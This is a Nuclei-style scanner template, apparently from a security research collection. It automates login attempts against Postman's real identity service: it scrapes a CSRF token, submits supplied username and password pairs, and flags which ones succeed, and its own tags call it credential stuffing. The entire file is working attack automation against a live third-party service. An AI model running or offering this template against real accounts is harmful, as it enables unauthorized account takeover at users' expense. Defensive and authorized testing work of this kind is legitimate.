http:
- attack: pitchfork
  extractors:
  - attribute: value
    internal: true
    name: csrfToken
    part: body
    type: xpath
    xpath:
    - /html/body/div/div/div[1]/form/input
  - dsl:
    - username
    - password
    type: dsl
  matchers:
  - condition: and
    dsl:
    - 'contains(to_lower(header), ''set-cookie: getpostmanlogin=yes'')'
    - contains(to_lower(body), 'identity.postman.co/continue')
    - status_code==200
    type: dsl
  raw:
  - 'GET https://identity.getpostman.com/login HTTP/1.1

    Host: identity.getpostman.com

    Referer: https://identity.getpostman.com/accounts

    '
  - 'POST https://identity.getpostman.com/login HTTP/1.1

    Host: identity.getpostman.com

    Content-Type: application/json;charset=UTF-8

    X-Csrf-Token: {{csrfToken}}

    Origin: https://identity.getpostman.com

    Referer: https://identity.getpostman.com/login


    {"username":"{{username}}","password":"{{password}}"}

    '
id: postman-login-check
info:
  author: parthmalhotra,pdresearch
  description: Checks for a valid postman account.
  metadata:
    max-request: 2
  name: Postman Login Check
  reference:
  - https://owasp.org/www-community/attacks/Credential_stuffing
  severity: critical
  tags: login-check,postman,creds-stuffing
self-contained: true
